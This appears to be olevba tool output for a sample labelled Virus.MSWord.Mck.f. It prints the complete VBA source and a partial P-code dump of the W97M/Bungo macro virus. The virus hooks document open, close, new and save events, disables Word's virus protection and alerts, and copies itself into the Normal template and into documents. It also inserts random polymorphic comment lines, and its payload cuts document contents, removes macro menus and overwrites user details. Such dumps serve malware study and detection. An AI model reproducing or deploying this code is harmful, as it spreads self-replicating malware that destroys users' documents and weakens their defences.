olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mck.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mck.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bungo.bas 
in file: ./Virus.MSWord.Mck.f - OLE stream: 'Macros/VBA/Bungo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Virus Name: W97M/Bungo
'Author Name: Lucky Warrior
'Copyright (c) 1999 Bgy. Tiguib, O.E.S.
'All rights reserved.

'I dedicate this virus to my roommates, namely:
'Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
'
'Thanks Guys!! for everything...
'
'-Lucky Warrior 10 November 1999
'END


Sub AutoOpen()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
Rem FxNmSoCeJuMkTjMjBkMwTvKjIsJkFzSoDuJsEeAuGtGyIkLtFlCtEpBlLuOvJpLpEuSqNpBoLm
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Rem JnArUoBzUhOjLsNxDe
Call GoToHell
End Sub

Sub AutoNew()
Rem HiEuSfDvQvKyAuFsLnBwQyBiIwHjEmKuJwGrByDuPyVmGrBpLuRqGp
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub AutoClose()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Rem RlOnLwFjFsCmTxTtSvUwJqMjRxEjAfLiIgApTmJzGjCnUzRrGf
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
Rem PtUlEnBpJxRoCyLzTsDjOsJsTkElHqInQyTiEnUwJiNv
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Rem IyJsUiDpQgOzDhNzQqTfBoLiSjPhTfIoVqPsJgCwDvExSlIyOqJgTrFlTjGr
Options.SaveNormalPrompt = False
Rem KqDjKfVoSyJlAwKxHpSyMiGiDlSfQqFjMsPyLkBwHnSjQmUgIwHxLs
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
Rem OkRvLkEvDtAgVlCrCrMo
End If
Application.DisplayAlerts = wdAlertsAll
Rem RmBqOzBjVqCrEkGjLfQqRqHpIkTsMeIjPiPyFfFjHrEuHwOjBtLiQrUr
Call GoToHell
End Sub

Sub AutoExec()
Rem KtNnMmEsImRfAiHuJlNwUyIuJoGfKwJgBrPsCsDuNxOwUjQpFiQrGgEvMeKgExPyCpViUsKvUjKg
On Error Resume Next
Rem FtJgOvPpEzCiNnVnHhHr
Rem JxMnQzMhGrLkTmCsRlTmLhLlUrQnLlDgAvMlEoEvBoQwVhUsIfAsOnExAlCj
Call Payload
Application.ScreenUpdating = False
Rem LnIuTwRnPqRtLmAiRoEiHoMhFiVvNmShFuQfNkTwEwCgVuTfEiUyIhKnLkRfSkKvEpQe
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
Rem NjLtRuJhNsHsJsLhGgMgStItViFzFySrTyAoTuIxLlIuOiOiDx
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
Rem LlBpOvUlUwUxKfMpJfEuLgAyQpMqOzMlKpRiTlDsQgGnDl
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Rem OvGjGuJhTtEwOrBqEoKjRiTw
Rem FsOzGhQwNoSjJjHeAqCqPpBkTpSwGgPtRvThTrSjDiBiGwBiQiKzPyNeVtDeIkVmKlKfDuCySz
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub FileSaveAs()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Rem SgLoKuPuGjMhEvUhIlVlFsJuSjTgDsLwDzSpLwAoCiCzHuTeAp
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Rem OiVlEvRsErBrIgLvQmGo
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Rem GsQzUlCyIlCzUyCiNvEwAeCfFlHgDwJxVrToVwPgKfSmFyHqSrFoLjEh
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub FileSave()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Rem NyVoOiPwKyLlGxJuApVxBoEsVrGsInUtHrJwUs
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
ActiveDocument.Save
Rem EjJuEmJjJhFwDqIyGqFePxQyReUjJrCuSrPkAkFhJfJeNwNzKnPe
End Sub

Sub GoToHell()
Rem GkNlNwDtThSrPoLvTsHrGvNtSx
On Error Resume Next
Randomize
Rem GeBeEmFvHeHnNrLqJuGiDpInSoGzFuKoRiQmJnNuRfLtSqJqFxLhRsPfBrGrGfDsTyEyJqPoSrFo
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
For TheLine = 1 To .CountOfLines
Rem RhGuQoTjOzHxQuFjAuDtMsSePnKrRm
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Rem FvRoDrRwMeOhQyPvPo
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
PolySize = Int(Rnd * 10)
Rem FsIjSiMnKhOzDzSsSnQnPtQwEwDvNhAt
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
Rem UgUi
End With
End If
End Sub

Sub Payload()
  On Error Resume Next
    If Day(Now) = Day(Now) And Minute(Now) <= 30 Then
    Selection.Wholestory
    Selection.Cut
    End If
  ActiveDocument.SaveAs ActiveDocument.FullName
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  Application.Username = "Lucky Warrior"
  Application.UserInitials = "LW"
  Application.UserAddress = "Bgy. Tiguib, O.E.S."
  With Dialogs(wdDialogFileSummaryInfo)
  .Author = "Lucky Warrior"
  .Keywords = "W97M/Bungo"
  .Comments = "More to come..."
  .Execute
  End With
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mck.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1117 bytes
' Macros/VBA/Bungo - 17345 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 "Virus Name: W97M/Bungo"
' Line #1:
' 	QuoteRem 0x0000 0x001A "Author Name: Lucky Warrior"
' Line #2:
' 	QuoteRem 0x0000 0x0026 "Copyright (c) 1999 Bgy. Tiguib, O.E.S."
' Line #3:
' 	QuoteRem 0x0000 0x0014 "All rights reserved."
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x002E "I dedicate this virus to my roommates, namely:"
' Line #6:
' 	QuoteRem 0x0000 0x0034 "Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel"
' Line #7:
' 	QuoteRem 0x0000 0x0000 ""
' Line #8:
' 	QuoteRem 0x0000 0x001F "Thanks Guys!! for everything..."
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	QuoteRem 0x0000 0x001F "-Lucky Warrior 10 November 1999"
' Line #11:
' 	QuoteRem 0x0000 0x0003 "END"
' Line #12:
' Line #13:
' Line #14:
' 	FuncDefn (Sub AutoOpen())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall (Call) Payload 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #22:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #23:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Rem 0x004B " FxNmSoCeJuMkTjMjBkMwTvKjIsJkFzSoDuJsEeAuGtGyIkLtFlCtEpBlLuOvJpLpEuSqNpBoLm"
' Line #27:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #28:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #32:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	StartForVariable 
' 	Next 
' Line #36:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #37:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #42:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #45:
' 	Rem 0x0013 " JnArUoBzUhOjLsNxDe"
' Line #46:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #47:
' 	EndSub 
' Line #48:
' Line #49:
' 	FuncDefn (Sub AutoNew())
' Line #50:
' 	Rem 0x0037 " HiEuSfDvQvKyAuFsLnBwQyBiIwHjEmKuJwGrByDuPyVmGrBpLuRqGp"
' Line #51:
' 	OnError (Resume Next) 
' Line #52:
' 	ArgsCall (Call) Payload 0x0000 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #54:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #55:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #56:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #57:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #58:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #59:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #60:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #61:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #62:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #63:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	StartForVariable 
' 	Next 
' Line #66:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #67:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	StartForVariable 
' 	Next 
' Line #71:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #72:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #76:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #77:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #78:
' 	EndIfBlock 
' Line #79:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #80:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #81:
' 	EndSub 
' Line #82:
' Line #83:
' 	FuncDefn (Sub AutoClose())
' Line #84:
' 	OnError (Resume Next) 
' Line #85:
' 	ArgsCall (Call) Payload 0x0000 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #87:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #88:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #89:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #90:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #91:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #92:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #93:
' 	Rem 0x0033 " RlOnLwFjFsCmTxTtSvUwJqMjRxEjAfLiIgApTmJzGjCnUzRrGf"
' Line #94:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #96:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #98:
' 	EndIfBlock 
' Line #99:
' 	StartForVariable 
' 	Next 
' Line #100:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #101:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #102:
' 	Rem 0x002D " PtUlEnBpJxRoCyLzTsDjOsJsTkElHqInQyTiEnUwJiNv"
' Line #103:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	StartForVariable 
' 	Next 
' Line #106:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #107:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #108:
' 	Rem 0x003D " IyJsUiDpQgOzDhNzQqTfBoLiSjPhTfIoVqPsJgCwDvExSlIyOqJgTrFlTjGr"
' Line #109:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #110:
' 	Rem 0x0037 " KqDjKfVoSyJlAwKxHpSyMiGiDlSfQqFjMsPyLkBwHnSjQmUgIwHxLs"
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #113:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #114:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #115:
' 	Rem 0x0015 " OkRvLkEvDtAgVlCrCrMo"
' Line #116:
' 	EndIfBlock 
' Line #117:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #118:
' 	Rem 0x0039 " RmBqOzBjVqCrEkGjLfQqRqHpIkTsMeIjPiPyFfFjHrEuHwOjBtLiQrUr"
' Line #119:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	FuncDefn (Sub AutoExec())
' Line #123:
' 	Rem 0x004D " KtNnMmEsImRfAiHuJlNwUyIuJoGfKwJgBrPsCsDuNxOwUjQpFiQrGgEvMeKgExPyCpViUsKvUjKg"
' Line #124:
' 	OnError (Resume Next) 
' Line #125:
' 	Rem 0x0015 " FtJgOvPpEzCiNnVnHhHr"
' Line #126:
' 	Rem 0x003D " JxMnQzMhGrLkTmCsRlTmLhLlUrQnLlDgAvMlEoEvBoQwVhUsIfAsOnExAlCj"
' Line #127:
' 	ArgsCall (Call) Payload 0x0000 
' Line #128:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #129:
' 	Rem 0x0045 " LnIuTwRnPqRtLmAiRoEiHoMhFiVvNmShFuQfNkTwEwCgVuTfEiUyIhKnLkRfSkKvEpQe"
' Line #130:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #131:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #132:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #133:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #134:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #135:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #136:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #137:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #138:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #139:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	StartForVariable 
' 	Next 
' Line #142:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #143:
' 	Rem 0x0033 " NjLtRuJhNsHsJsLhGgMgStItViFzFySrTyAoTuIxLlIuOiOiDx"
' Line #144:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #145:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #146:
' 	Rem 0x002F " LlBpOvUlUwUxKfMpJfEuLgAyQpMqOzMlKpRiTlDsQgGnDl"
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	StartForVariable 
' 	Next 
' Line #149:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #150:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #151:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #154:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #155:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #156:
' 	EndIfBlock 
' Line #157:
